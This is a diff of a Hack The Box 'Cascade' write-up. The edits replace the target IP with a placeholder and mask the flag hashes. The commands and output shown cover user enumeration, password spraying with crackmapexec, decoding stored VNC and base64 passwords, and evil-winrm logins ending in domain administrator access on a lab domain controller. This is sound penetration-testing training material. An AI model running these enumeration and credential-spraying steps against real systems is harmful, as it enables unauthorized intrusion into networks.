@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Cascade
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-cascade-infocard.png)
-
 This medium difficulty Windows machine was a good refresher on themes and techniques I had seen in other machines \(such as [Nest](nest-write-up.md)\), but also introduced new things and gave enough of a challenge to be quite fun. With proper enumeration this should be a fairly easy challenge, depending on the comfort level with some aspects \(such as reading C\# code\).
 
 ## Useful Skills and Tools
@@ -63,14 +61,14 @@ Binaries written in .NET languages \(such as C\#\) are fairly simple to break do
 
 #### **Nmap scan**
 
-I started my enumeration with an nmap scan of `10.10.10.182`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
 At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.
 
 ```text
-zweilos@kalimaa:~/htb/cascade$ nmap -p- -sC -sV -Pn -oN cascade.nmap 10.10.10.182
+zweilos@kalimaa:~/htb/cascade$ nmap -p- -sC -sV -Pn -oN cascade.nmap <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 18:46 EDT
-Nmap scan report for 10.10.10.182
+Nmap scan report for <YOUR_IP>
 Host is up (0.050s latency).
 Not shown: 65520 filtered ports
 PORT      STATE SERVICE       VERSION
@@ -115,7 +113,7 @@ The nmap OS detection script identified this machine as `windows_server_2008:r2:
 Next, I connected to the RPC service using `rpcclient`.
 
 ```text
-rpcclient -U "" -N 10.10.10.182
+rpcclient -U "" -N <YOUR_IP>
 
 rpcclient $> enumdomusers
 user:[CascGuest] rid:[0x1f5]
@@ -143,55 +141,55 @@ I saved the usernames to a file and ran the Metasploit module `auxiliary(gather/
 
 ```text
 msf5 auxiliary(gather/kerberos_enumusers) > run
-[*] Running module against 10.10.10.182
+[*] Running module against <YOUR_IP>
 
 [*] Validating options...
 [*] Using domain: CASCADE.LOCAL...
-[*] 10.10.10.182:88 - Testing User: "cascguest"...
-[*] 10.10.10.182:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
-[-] 10.10.10.182:88 - User: "cascguest" account disabled or locked out
-[*] 10.10.10.182:88 - Testing User: "arksvc"...
-[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.182:88 - User: "arksvc" is present
-[*] 10.10.10.182:88 - Testing User: "s.smith"...
-[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.182:88 - User: "s.smith" is present
-[*] 10.10.10.182:88 - Testing User: "r.thompson"...
-[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.182:88 - User: "r.thompson" is present
-[*] 10.10.10.182:88 - Testing User: "util"...
-[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.182:88 - User: "util" is present
-[*] 10.10.10.182:88 - Testing User: "j.wakefield"...
-[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.182:88 - User: "j.wakefield" is present
-[*] 10.10.10.182:88 - Testing User: "s.hickson"...
-[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.182:88 - User: "s.hickson" is present
-[*] 10.10.10.182:88 - Testing User: "j.goodhand"...
-[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.182:88 - User: "j.goodhand" is present
-[*] 10.10.10.182:88 - Testing User: "a.turnbull"...
-[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.182:88 - User: "a.turnbull" is present
-[*] 10.10.10.182:88 - Testing User: "e.crowe"...
-[*] 10.10.10.182:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
-[-] 10.10.10.182:88 - User: "e.crowe" account disabled or locked out
-[*] 10.10.10.182:88 - Testing User: "b.hanson"...
-[*] 10.10.10.182:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
-[-] 10.10.10.182:88 - User: "b.hanson" account disabled or locked out
-[*] 10.10.10.182:88 - Testing User: "d.burman"...
-[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.182:88 - User: "d.burman" is present
-[*] 10.10.10.182:88 - Testing User: "backupsvc"...
-[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.182:88 - User: "backupsvc" is present
-[*] 10.10.10.182:88 - Testing User: "j.allen"...
-[*] 10.10.10.182:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
-[+] 10.10.10.182:88 - User: "j.allen" is present
-[*] 10.10.10.182:88 - Testing User: "i.croft"...
-[*] 10.10.10.182:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
-[-] 10.10.10.182:88 - User: "i.croft" account disabled or locked out
+[*] <YOUR_IP>:88 - Testing User: "cascguest"...
+[*] <YOUR_IP>:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
+[-] <YOUR_IP>:88 - User: "cascguest" account disabled or locked out
+[*] <YOUR_IP>:88 - Testing User: "arksvc"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "arksvc" is present
+[*] <YOUR_IP>:88 - Testing User: "s.smith"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "s.smith" is present
+[*] <YOUR_IP>:88 - Testing User: "r.thompson"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "r.thompson" is present
+[*] <YOUR_IP>:88 - Testing User: "util"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "util" is present
+[*] <YOUR_IP>:88 - Testing User: "j.wakefield"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "j.wakefield" is present
+[*] <YOUR_IP>:88 - Testing User: "s.hickson"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "s.hickson" is present
+[*] <YOUR_IP>:88 - Testing User: "j.goodhand"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "j.goodhand" is present
+[*] <YOUR_IP>:88 - Testing User: "a.turnbull"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "a.turnbull" is present
+[*] <YOUR_IP>:88 - Testing User: "e.crowe"...
+[*] <YOUR_IP>:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
+[-] <YOUR_IP>:88 - User: "e.crowe" account disabled or locked out
+[*] <YOUR_IP>:88 - Testing User: "b.hanson"...
+[*] <YOUR_IP>:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
+[-] <YOUR_IP>:88 - User: "b.hanson" account disabled or locked out
+[*] <YOUR_IP>:88 - Testing User: "d.burman"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "d.burman" is present
+[*] <YOUR_IP>:88 - Testing User: "backupsvc"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "backupsvc" is present
+[*] <YOUR_IP>:88 - Testing User: "j.allen"...
+[*] <YOUR_IP>:88 - KDC_ERR_PREAUTH_REQUIRED - Additional pre-authentication required
+[+] <YOUR_IP>:88 - User: "j.allen" is present
+[*] <YOUR_IP>:88 - Testing User: "i.croft"...
+[*] <YOUR_IP>:88 - KDC_ERR_CLIENT_REVOKED - Clients credentials have been revoked
+[-] <YOUR_IP>:88 - User: "i.croft" account disabled or locked out
 [*] Auxiliary module execution completed
 ```
 
@@ -274,7 +272,7 @@ The most useful information I got from this was the group membership for each us
 Some of the interesting groups insinuated that there was a `Data` and an `Audit` share folder.
 
 ```text
-zweilos@kalimaa:~/htb/cascade$ smbclient -N \\\\10.10.10.182\\Data
+zweilos@kalimaa:~/htb/cascade$ smbclient -N \\\\<YOUR_IP>\\Data
 Anonymous login successful
 tree connect failed: NT_STATUS_ACCESS_DENIED
 ```
@@ -376,15 +374,15 @@ Base64 decoding `clk0bjVldmE=` gave me the password `rY4n5eva`.
 I saved this password to my **passwords** file and used `crackmapexec` to test all of the users against SMB with this password.  
 
 ```text
-zweilos@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade 10.10.10.182
+zweilos@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade <YOUR_IP>
 
 Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:CASCADE) (signing:True) (SMBv1:False)
 
-SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:Cascade) (signing:True) (SMBv1:False)
-SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
-SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
-SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
-SMB         10.10.10.182    445    CASC-DC1         [+] Cascade\r.thompson:rY4n5eva
+SMB         <YOUR_IP>    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:Cascade) (signing:True) (SMBv1:False)
+SMB         <YOUR_IP>    445    CASC-DC1         [-] Cascade\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    CASC-DC1         [-] Cascade\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    CASC-DC1         [-] Cascade\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    CASC-DC1         [+] Cascade\r.thompson:rY4n5eva
 ```
 
 As expected, the password belonged to `r.thompson`. 
@@ -398,8 +396,8 @@ As expected, the password belonged to `r.thompson`.
 Using my new credentials, I was able to get a full listing of the network shares on this machine.
 
 ```text
-zweilos@kalimaa:~/htb/cascade$ smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva
-[+] IP: 10.10.10.182:445        Name: Casc-DC1                                          
+zweilos@kalimaa:~/htb/cascade$ smbmap -H <YOUR_IP> -u r.thompson -p rY4n5eva
+[+] IP: <YOUR_IP>:445        Name: Casc-DC1                                          
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         ADMIN$                                                  NO ACCESS       Remote Admin
@@ -419,7 +417,7 @@ This user was only able to access **Data**, **NETLOGON**, **print$**, and **SYSV
 I checked **SYSVOL** first since it can sometimes contain passwords, but neither it nor **NETLOGON** had anything interesting.  The **print$** admin share only contained a bunch of printer drivers, and I didn't want to jump down the rabbit hole of looking for exploits there until I had exhausted all other avenues of enumeration.
 
 ```text
-zweilos@kalimaa:~/htb/cascade$ smbclient -U r.thompson -W Cascade \\\\10.10.10.182\\data rY4n5eva
+zweilos@kalimaa:~/htb/cascade$ smbclient -U r.thompson -W Cascade \\\\<YOUR_IP>\\data rY4n5eva
 Try "help" to get a list of possible commands.
 smb: \> ls
   .                                   D        0  Sun Jan 26 22:27:34 2020
@@ -556,20 +554,20 @@ irb: warn: can't alias jobs from irb_jobs.
 **`frizb`** mentions that there is an easy way to decode this using the interactive Ruby prompt in Metasploit.  Using the "industry standard" decryption key `\x17\x52\x6b\x06\x23\x4e\x58\x07` I was able to decode the password `sT333ve2`.
 
 ```text
-zweilos@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade 10.10.10.182
-SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:Cascade) (signing:True) (SMBv1:False)
-SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
-SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\CascGuest:sT333ve2 STATUS_LOGON_FAILURE 
-SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
-SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\arksvc:sT333ve2 STATUS_LOGON_FAILURE 
-SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
-SMB         10.10.10.182    445    CASC-DC1         [+] Cascade\s.smith:sT333ve2
+zweilos@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade <YOUR_IP>
+SMB         <YOUR_IP>    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:Cascade) (signing:True) (SMBv1:False)
+SMB         <YOUR_IP>    445    CASC-DC1         [-] Cascade\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    CASC-DC1         [-] Cascade\CascGuest:sT333ve2 STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    CASC-DC1         [-] Cascade\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    CASC-DC1         [-] Cascade\arksvc:sT333ve2 STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    CASC-DC1         [-] Cascade\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    CASC-DC1         [+] Cascade\s.smith:sT333ve2
 ```
 
 ### **User.txt**
 
 ```text
-zweilos@kalimaa:~/htb/cascade$ evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182
+zweilos@kalimaa:~/htb/cascade$ evil-winrm -u s.smith -p sT333ve2 -i <YOUR_IP>
 
 Evil-WinRM shell v2.3
 
@@ -583,7 +581,6 @@ USER INFORMATION
 User Name       SID
 =============== ==============================================
 cascade\s.smith S-1-5-21-3332504370-1206983947-1165150453-1107
-
 
 GROUP INFORMATION
 -----------------
@@ -603,7 +600,6 @@ CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370
 NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
 
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -618,7 +614,7 @@ There were ne surprises in either the groups or privileges for `s.smith`.  I was
 
 ```text
 *Evil-WinRM* PS C:\Users\s.smith\Desktop> type user.txt
-f29abe4e609b2aebb4fe99257a9eb507
+****
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -630,8 +626,8 @@ f29abe4e609b2aebb4fe99257a9eb507
 Once again I fired up `smbmap` to see what level of access this user had to the **Audit$** share folder since I didn't know where it was mounted in the filesystem.  
 
 ```text
-zweilos@kalimaa:~/htb/cascade$ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
-[+] IP: 10.10.10.182:445        Name: Casc-DC1                                          
+zweilos@kalimaa:~/htb/cascade$ smbmap -H <YOUR_IP> -u s.smith -p sT333ve2
+[+] IP: <YOUR_IP>:445        Name: Casc-DC1                                          
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         ADMIN$                                                  NO ACCESS       Remote Admin
@@ -647,7 +643,7 @@ zweilos@kalimaa:~/htb/cascade$ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
 `s.smith` only had Read access to the **Data** and **Audit** shares, as well as **print$**, **NETLOGON**, and **SYSVOL**
 
 ```text
-zweilos@kalimaa:~/htb/cascade$ smbclient -U s.smith -W Cascade \\\\10.10.10.182\\Audit$
+zweilos@kalimaa:~/htb/cascade$ smbclient -U s.smith -W Cascade \\\\<YOUR_IP>\\Audit$
 Enter CASCADE\s.smith's password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -728,7 +724,7 @@ After a little bit of work to make the code function as a stand-alone program, i
 ### Moving Laterally to `arksvc`
 
 ```text
-zweilos@kalimaa:~/htb/cascade$ evil-winrm -u arksvc -p w3lc0meFr31nd -i 10.10.10.182
+zweilos@kalimaa:~/htb/cascade$ evil-winrm -u arksvc -p w3lc0meFr31nd -i <YOUR_IP>
 
 Evil-WinRM shell v2.3
 
@@ -742,7 +738,6 @@ USER INFORMATION
 User Name      SID
 ============== ==============================================
 cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106
-
 
 GROUP INFORMATION
 -----------------
@@ -761,7 +756,6 @@ CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370
 CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
 NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
-
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -937,12 +931,12 @@ Decoding the base64 string `YmFDVDNyMWFOMDBkbGVz` gave me the password `baCT3r1a
 ## **Getting an Administrator shell**
 
 ```text
-zweilos@kalimaa:~/htb/cascade$ crackmapexec winrm -u users -p passwords -d Cascade 10.10.10.182
-WINRM       10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
-WINRM       10.10.10.182    5985   CASC-DC1         [-] Cascade\Administrator:rY4n5eva "the specified credentials were rejected by the server"
-WINRM       10.10.10.182    5985   CASC-DC1         [-] Cascade\Administrator:sT333ve2 "the specified credentials were rejected by the server"
-WINRM       10.10.10.182    5985   CASC-DC1         [-] Cascade\Administrator:w3lc0meFr31nd "the specified credentials were rejected by the server"
-WINRM       10.10.10.182    5985   CASC-DC1         [+] Cascade\Administrator:baCT3r1aN00dles (Pwn3d!)
+zweilos@kalimaa:~/htb/cascade$ crackmapexec winrm -u users -p passwords -d Cascade <YOUR_IP>
+WINRM       <YOUR_IP>    5985   CASC-DC1         [*] http://<YOUR_IP>:5985/wsman
+WINRM       <YOUR_IP>    5985   CASC-DC1         [-] Cascade\Administrator:rY4n5eva "the specified credentials were rejected by the server"
+WINRM       <YOUR_IP>    5985   CASC-DC1         [-] Cascade\Administrator:sT333ve2 "the specified credentials were rejected by the server"
+WINRM       <YOUR_IP>    5985   CASC-DC1         [-] Cascade\Administrator:w3lc0meFr31nd "the specified credentials were rejected by the server"
+WINRM       <YOUR_IP>    5985   CASC-DC1         [+] Cascade\Administrator:baCT3r1aN00dles (Pwn3d!)
 ```
 
 _Pwn3d!_
@@ -952,28 +946,24 @@ _Pwn3d!_
 After getting the password for `TempAdmin`, ****which I had read earlier was the same as the normal Administrator account, I was able to finally login to an Administrator shell and gather up my hard-earned loot.
 
 ```text
-zweilos@kalimaa:~/htb/cascade$ evil-winrm -u Administrator -p baCT3r1aN00dles -i 10.10.10.182
+zweilos@kalimaa:~/htb/cascade$ evil-winrm -u Administrator -p baCT3r1aN00dles -i <YOUR_IP>
 
 Evil-WinRM shell v2.3
 
 Info: Establishing connection to remote endpoint
 
-
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
 
-
     Directory: C:\Users\Administrator\Desktop
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -ar---        7/26/2020   8:56 AM             34 root.txt
 -a----        3/25/2020  11:17 AM           1031 WinDirStat.lnk
 
-
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-c819f64119a10a2aa646d6883796d488
+****
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /all
 
 USER INFORMATION
@@ -982,7 +972,6 @@ USER INFORMATION
 User Name             SID
 ===================== =============================================
 cascade\administrator S-1-5-21-3332504370-1206983947-1165150453-500
-
 
 GROUP INFORMATION
 -----------------
@@ -1004,7 +993,6 @@ CASCADE\Data Share                             Alias            S-1-5-21-3332504
 CASCADE\Denied RODC Password Replication Group Alias            S-1-5-21-3332504370-1206983947-1165150453-572  Mandatory group, Enabled by default, Enabled group, Local Group
 NT AUTHORITY\NTLM Authentication               Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
 Mandatory Label\High Mandatory Level           Label            S-1-16-12288
-
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -1040,7 +1028,3 @@ SeCreateSymbolicLinkPrivilege   Create symbolic links                           
 ```
 
 Woot! Domain Admin!
-
-Thanks to [`Vbscrub`](https://www.hackthebox.eu/home/users/profile/158833) for this machine which was fairly easy, but had some interesting takes on old methods and also included some things which were new to me.  Easy challenges should never be beneath you, because each one is a validation of how much you have learned!
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
